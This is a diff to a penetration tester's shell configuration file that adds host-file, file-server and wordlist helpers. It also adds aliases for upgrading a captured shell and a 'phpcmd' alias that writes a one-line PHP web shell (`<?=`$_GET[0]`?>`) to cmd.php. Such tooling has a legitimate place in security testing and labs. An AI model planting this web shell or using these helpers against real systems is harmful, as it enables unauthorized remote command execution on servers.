@@ -37,6 +37,27 @@ ligdel() {
     ip tuntap del mode tun "$1"
 }
 
+# Hosts
+addhost() {
+    if [ "$#" -ne 2 ]; then
+      echo "[i] Usage: addhost <ip> <hostname>"
+      return 1
+    fi
+
+    ip="$1"
+    hostname="$2"
+    if grep -q "^$ip" /etc/hosts; then
+      sudo sed -i "/^$ip/s/$/ $hostname/" /etc/hosts
+      echo "[+] Appended $hostname to existing entry for $ip in /etc/hosts"
+    else
+      echo "$ip $hostname" | sudo tee -a /etc/hosts > /dev/null
+      echo "[+] Added new entry: $ip $hostname to /etc/hosts"
+    fi
+
+    grep "^$ip" /etc/hosts
+}
+
+
 #---------
 # ALIASES
 #---------
@@ -45,10 +66,11 @@ ligdel() {
 alias lab='cd ~/lab'
 
 ## http server
-alias server='cd /opt/transfer; ls; python3 -m http.server 80'
+alias transfer='cd /opt/transfer; ls; python3 -m http.server 80'
+alias www='ls; python3 -m http.server 80'
 
 ## fping
-alias fping='fping -agq'
+#alias fping='fping -agq'
 
 ## bloodhound
 alias bloodhound='neo4j start; bloodhound'
@@ -60,3 +82,17 @@ alias sstimap='/opt/SSTImap/sstimap.py -i'
 export rockyou='/usr/share/wordlists/rockyou.txt'
 export directory='/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt'
 export usernames='/usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt'
+
+## tty
+pytty () {
+  echo "python3 -c 'import pty;pty.spawn(\"/bin/bash\")';python -c 'import pty;pty.spawn(\"/bin/bash\")'"| xclip -sel clip
+  echo "[+] Command copied to clipboard!"
+}
+scriptty() {
+    echo '/usr/bin/script -qc /bin/bash /dev/null'| xclip -sel clip
+    echo "[+] Command copied to clipboard!"
+ }
+alias fixtty='stty raw -echo; fg; reset'
+
+## phpcmd
+alias phpcmd='echo "<?=\`\$_GET[0]\`?>" > cmd.php && echo "[+] Wrote <?=\`\$_GET[0]\`?> in cmd.php"'
